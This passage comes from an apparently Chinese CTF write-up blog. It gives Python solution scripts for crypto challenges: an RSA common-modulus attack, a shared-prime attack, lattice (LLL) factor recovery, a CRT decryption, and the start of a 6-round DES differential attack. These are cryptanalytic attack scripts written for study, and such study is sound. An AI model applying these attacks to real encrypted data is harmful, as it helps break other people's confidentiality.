class="number">66738113223447221430009739914948303261002811553064307532926788024694319846909340806982708347904688420671656410554852340732395818007063648478593071665936277836988050526188064146099581039172667768507259894363266310279948729552649788129953872816024709989260060633285022337107662251504618369065597018450927041881262189584381809106166042131798086882746986243210896131714227544235843922107304728228549916171484199199612243776469423359120753888158616202476325705252715374109256790899923317253605743212561589807498078080069511918514647943399566630574192829185904868376879831247378819590121286186417825591746918495311372015707767009078229770450338244309693800180936418605756818618708750868807720566288044943952844</span></span><br><span class="line">c2 = <span class="number">88330949146651042517337653740810385187361689012501792799900873279978736035790659211001047937337215121948527017022967642906632732136313750277237761910710915459733551421653259986088596828049455592613225962133163865584111828012197112528645520371075411167515961263199635568730334149461654340122507778194391601956023625429418297129608911450200836427221311442323768087256798964844787274408624548839536279704401007441198390922847003287643673183230633728790263593607595427088882078742699027563601046309308221108391158848644822374865676056755011459026909057983805069264236657111115914570543103494726584296335044897998794251877515750910330960179539465060133592380802344398038815679281272098815068185059127533110716</span></span><br><span class="line">e1 = <span class="number">49</span></span><br><span class="line">e2 = <span class="number">35</span></span><br><span class="line">e1 = e1 // <span class="number">7</span></span><br><span class="line">e2 = e2 // <span class="number">7</span></span><br><span class="line"><span class="comment"># 共模</span></span><br><span class="line">gcd = gmpy2.gcdext(e1, e2)</span><br><span class="line">s, t = gcd[<span class="number">1</span>], gcd[<span class="number">2</span>]</span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s, n) * <span class="built_in">pow</span>(c2, t, n)) % n</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pd = m + k * n</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(pd, <span class="number">7</span>)[<span class="number">1</span>]:</span><br><span class="line">        m = gmpy2.iroot(pd, <span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2, sympy</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">20663949646446787716947370247427064802032290773674573417491154934657966734874241036307633567695175131014840617208051931753476223149652427133485160771068994073566431652969243962290116898345337189704974833817335135391974497754670322430159624252007005736522065638860351992074099453212550475552692645688800084354832716662142860413158369020005830095049988807931794736876563293916525328174812726514626029103506607813186690909585870115364600969148482617083817273910020722354923244093624032174432568413187131385994452769295894606345768596899824635672699945050103814681553981019917552667794514804359500108947102234376726009329</span></span><br><span class="line">n2 = <span class="number">23260834024376640092536888922041147168387702014814910549469730354688848760379274203088716649609675449936234732528778557041701524981200368996310064584479657042098426164366286670115392015865853892816983885530312074073396422301009513106258655315791720535737587913264728919869055970993613641008348186263870234072422880033882864603438907070864271470483691729705421547143623305055532339107777314310976947392833395180922324243244784018964736826235018388498516438612962123562977736924674510730898077787055367234786519915374446506561992135856904927351307275140543635152771670410211235702283822782412971646092584646758107766061</span></span><br><span class="line">c1 = <span class="number">20522772249591436865905796103232542494211695376973377722875606678999899690405480809231671346489821878050354380591999935960795888483664473952207298504196203830543208477229162177648586683957831016664569242538775928728009699300145355818417233892295367828930893733774091897666206696635744262884229680137381841581000794056156842812583057103472764486608022028638288161256424936523444974815727764620634174112474612238992061186937613171878635903455700636894570504376153482600057655480654731180740098435209814585459376319844315388048636156465832997913885636776523217188604040216732137108997444787157007665652718553013424347649</span></span><br><span class="line">c2 = <span class="number">18715009944766815149492560645051626329204114049927707292306481018724323433701970253541495090244787378826569549885480491764057526828531429033378143426272248940256432423939977805246742287886281853484696625486522535042794403288199393432900065504766428665320682811338887618389589263597065738414638013423594446322359052784842619755053094028050245325637698678444632860097510081832077842610716042473697478416213915805481704537884611126069907812621750817901278803326304784057145916721693930579344441283586458621033705530309835431139751025999089707480829034535026967779441379062426254038310930863215188888662357133997908688736</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p1 = p2 = <span class="number">164191231045422009074679930433073849686608596460797940497084950906692563939261895269401690836512154669515255321804498701003730937677434175304628078067019456817509909926385910687416167113488565839415507069711043038798586300266539865754500210993744814031474822524861888158435667202218855321354190565150175051579</span></span><br><span class="line">q1 = n1 // p1</span><br><span class="line">q2 = n2 // p2</span><br><span class="line"></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1) + long_to_bytes(m2))</span><br></pre></td></tr></table></figure><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">11223534598141520071392544441952727165225232358333005778273904279807651365082135278999006409297342081157139972503703772556228315654837441044781410960887536342197257046095815516053582104516752168718754752274252871063410625756822861003235434929734796245933907621657696650609132419469456238860601166224944487116</span></span><br><span class="line">n = <span class="number">99499509473364452726944770421623721217675378717234178828554602484867641740497277374806036356486848621495917213623425604565104435195783450029879177770305417469850119739921527698744700219067563802483159458398895082044997907953256062342593605652927874232404778144112740505724215742062859322375891810785229735653</span></span><br><span class="line">M = <span class="number">28858066896535909755146975040720031655813099454455588895434479778600245612915775220883088811806723015938061791264869678085304248608125313205719043320256733514389739252845381708094678596099621503299764646358765107958130065721737938646850422959290465490270263553423913213684958592738500488797707239673645370968467090153285601432966586133693641854092761919184904521240074718850103356119966387029699913571443658384564840234765103070736676067458391659605655580766436276719610283460962533141261830775028138998594269732067550977245136631815804641115446066102981044849495663224005844657686979516481904043008222498344271373989609634617315702887646444506965035406154183377067490922195507071571055579654138590566650703038341939225657159668601565182939447340585110418258653618384852356058444795156595720943362884361136229430356254095673818462046182310826133487611183265532844700265640889105864909560170846171486510513240630480729194415061752698286990999064594811803482429976978688266632277914610443963726561921790718480343488391563503774868490108659902216386976683532579945706490286814310031310144410303859633785939399012605326754445715302492704458881700872467560968264583996658711892595658439058034434031646411995511168849724976850557976639662545139917517675296224197763447929417263845949813741362574641118781293171167041592771305352186419565096347024619027397784780864922205105185970180629777320680707022011697404359388540366320053501502698747763307336114482530784826238326983596966436776918503653153420281803168537703048371580451</span></span><br><span class="line">h = <span class="number">24302462761412867722556483860201357169283131384498485449193507018526006760633350601593235386242712333885826513399701577522498685938541691414316724804357523659514319083860507720945068584985970098437482386854188516742033184163273293005356970701527614010961471490166306765208284126815267752826036846338185010168551115391901008731195800723630612524215610302192763771954146943262822909368086155537366851998954401585888789660061750804720858175620022924944428882337005545535959410243692854073069775794945154943244522898330286785483043492678802461244624116832548150221211726044545331789932659966539042635768789637635754297830131948383991027466194455817875377950516103513735000718642093769229006510961952865719649517629939801014585849419818774317178973918720330390674833583065434312010539617630210110724391629534996688713945139529416075521015600392479980677759342058040778532467875961508475990300178277703011765698425360329342396347848373844031930655143343217447877587074485794273364964346235973542157189093330870952677683308479410235841331914353677363106473914986073397716367455628483060709281215783434084559550690248426391913205234184130354155776334292729262232484610747771114078013979494659835579574006801652858265173309736540235377076956677464263798132149783780830729103485354096234062135454873557941791812722418582207577124971978987895472250326100927372068822672582017222521124179752698654114839303426099426224351872025466618402675104161895600513776962289703455252021742990686505176582638132300246212598903123706906104217087</span></span><br><span class="line">L = matrix([[<span class="number">1</span>, h], [<span class="number">0</span>, M]])</span><br><span class="line">x = L.LLL()[<span class="number">0</span>]</span><br><span class="line">p = <span class="built_in">abs</span>(x[<span class="number">1</span>]) + <span class="number">297498275426</span></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>用<code>yafu</code>发现可以分解<code>n</code></p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150756.png" alt="image-20220115003112934"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">p = <span class="number">7775037945450972074306550333494120484720176686937970436452427912326505124727011077406894038014608345834514099931510587280606879496551971589714415968674853</span></span><br><span class="line">q = <span class="number">7775037945450972074306550333494120484720176686937970436452427912326505124727011077406894038014608345834514099931510587280606879496551971589714415968674527</span></span><br><span class="line">n = <span class="number">60451215053202473004940952621742735161658776366659855277231745089406139921920247699935855664424690715827311751776376765039253720695107034417349327247413785321282310515940197744035889015386751355695663945883766755254889478550954910913617031495509031272479126330010210073745554866695555903062215643355046569531</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">5860001067333912869348276317959806331354930830756907188134520598132033029685961651079042255479216212218840727162091566460728252274773922656346335208185716</span></span><br><span class="line">c2 = <span class="number">233846791877558838234653540832234409293133184826445436186569970711741339843931083266127545694840179770763904903248540633847534630328748650704882388519907</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中国剩余定理计算c</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">a1, n1, a2, n2</span>):</span></span><br><span class="line">    d = math.gcd(n1, n2)</span><br><span class="line">    c = a2 - a1</span><br><span class="line">    <span class="keyword">if</span> c % d != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    c = (c % n2 + n2) % n2</span><br><span class="line">    c = c // d</span><br><span class="line">    n1 = n1 // d</span><br><span class="line">    n2 = n2 // d</span><br><span class="line">    c *= gmpy2.invert(n1, n2)</span><br><span class="line">    c %= n2</span><br><span class="line">    c *= n1 * d</span><br><span class="line">    c += a1</span><br><span class="line">    <span class="keyword">global</span> n3</span><br><span class="line">    <span class="keyword">global</span> a3</span><br><span class="line">    n3 = n1 * n2 * d</span><br><span class="line">    a3 = (c % n3 + n3) % n3</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    a1 = a[<span class="number">0</span>]</span><br><span class="line">    n1 = n[<span class="number">0</span>]</span><br><span class="line">    le = <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2 = n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1, n1, a2, n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">global</span> mod</span><br><span class="line">    mod = n1</span><br><span class="line">    <span class="keyword">return</span> (a1 % n1 + n1) % n1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n11 = [p, q]</span><br><span class="line">c11 = [c1, c2]</span><br><span class="line">c = CRT(c11, n11)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="RomeoAndJuliet"><a href="#RomeoAndJuliet" class="headerlink" title="RomeoAndJuliet"></a>RomeoAndJuliet</h2><p>DES6轮差分攻击</p><p><a href="https://blog.soreatu.com/posts/case-study-differetial-cryptanalysis-attack/">https://blog.soreatu.com/posts/case-study-differetial-cryptanalysis-attack/</a></p><p>测一下差分特征：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getRandomNBitInteger</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">s_box = [</span><br><span class="line">    [<span class="number">12</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">0</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">     <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">14</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">13</span>,</span><br><span class="line">     <span class="number">12</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">13</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span>,</span><br><span class="line">     <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span 